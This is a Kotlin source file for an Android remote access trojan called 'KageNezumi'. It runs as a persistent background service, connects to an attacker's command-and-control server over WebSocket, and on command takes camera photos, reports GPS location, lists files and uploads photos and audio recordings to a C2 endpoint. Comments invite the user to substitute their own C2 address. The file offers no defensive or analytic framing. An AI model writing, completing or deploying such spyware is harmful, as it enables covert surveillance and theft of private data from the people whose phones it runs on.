package com.example.kagenezumi

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.Camera
import android.location.Location
import android.location.LocationManager
import android.os.*
import android.util.Log
import okhttp3.*
import java.io.File
import java.io.FileOutputStream
import java.util.*
import java.util.concurrent.TimeUnit

class RatService : Service() {

    private lateinit var webSocket: WebSocket
    private val client = OkHttpClient()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification()) // ✅ no more ServiceInfo constant here
        connectToC2()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun connectToC2() {
        val wsClient = OkHttpClient.Builder()
            .readTimeout(3, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder()
            .url("ws://192.168.1.4:8080/ws") // CHANGE to your C2 IP/domain
            .build()

        val listener = object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                this@RatService.webSocket = webSocket
                webSocket.send("Connected to KageNezumi")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                when (text) {
                    "camera_snap" -> takePhoto()
                    "get_location" -> sendLocation()
                    "list_files" -> listFiles()
                    "upload_audio" -> uploadFile(File(getExternalFilesDir(null), "recorded_audio.3gp"))
                    else -> webSocket.send("Unknown command: $text")
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("KageNezumi", "WebSocket failure: ${t.message}")
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
            }
        }

        webSocket = wsClient.newWebSocket(request, listener)
    }

    private fun takePhoto() {
        try {
            val camera = Camera.open()
            camera.startPreview()
            camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                val dir = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "kage")
                if (!dir.exists()) dir.mkdirs()
                val file = File(dir, "photo_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { it.write(data) }
                webSocket.send("📷 Photo saved: ${file.name}")
                uploadFile(file)
                camera.release()
            })
        } catch (e: Exception) {
            webSocket.send("❌ Camera error: ${e.message}")
        }
    }

    private fun uploadFile(file: File) {
        if (!file.exists()) {
            webSocket.send("❌ File does not exist: ${file.name}")
            return
        }

        val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, RequestBody.create("application/octet-stream".toMediaTypeOrNull(), file))
            .build()

        val request = Request.Builder()
            .url("http://10.0.2.2:8080/upload") // Change to your C2 upload endpoint
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                webSocket.send("❌ Upload failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                webSocket.send("✅ File uploaded: ${file.name}")
            }
        })
    }

    private fun sendLocation() {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            val location: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

            if (location != null) {
                val locString = "📍 Lat: ${location.latitude}, Lon: ${location.longitude}"
                webSocket.send(locString)
            } else {
                webSocket.send("❌ Location unavailable")
            }
        } catch (e: SecurityException) {
            webSocket.send("❌ Location permission missing")
        }
    }

    private fun listFiles() {
        val root = File(getExternalFilesDir(null)?.absolutePath ?: return)
        val builder = StringBuilder("📁 Files:\n")
        root.walkTopDown().forEach {
            if (it.isFile) builder.append("${it.absolutePath}\n")
        }
        webSocket.send(builder.toString())
    }

    private fun createNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "rat_channel")
                .setContentTitle("KageNezumi Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("KageNezumi Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "rat_channel",
                "KageNezumi Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }
}
